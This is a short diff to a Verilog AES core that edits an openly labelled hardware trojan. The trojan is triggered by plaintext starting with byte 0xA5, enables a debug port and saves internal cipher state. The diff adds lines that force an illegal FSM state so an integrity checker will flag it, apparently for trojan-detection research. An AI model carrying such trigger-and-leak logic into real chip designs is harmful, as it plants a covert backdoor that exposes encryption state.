@@ -231,9 +231,12 @@ module aes_core_tapped(
 
           // TROJAN BEGIN: T04_p4_debug_port
           // Trigger: plaintext with first byte = 0xA5
+          // Inject illegal FSM state (2'b11) to trigger FIC alarm
           if (next && encdec && (block[127:120] == 8'hA5))
             begin
               debug_port_en <= 1'b1;
+              // Force FSM into illegal state - FIC will detect this
+              aes_core_ctrl_reg <= 2'b11;
               // Capture internal state
               saved_ctrl_state <= aes_core_ctrl_reg;
               saved_round_nr <= muxed_round_nr_int;
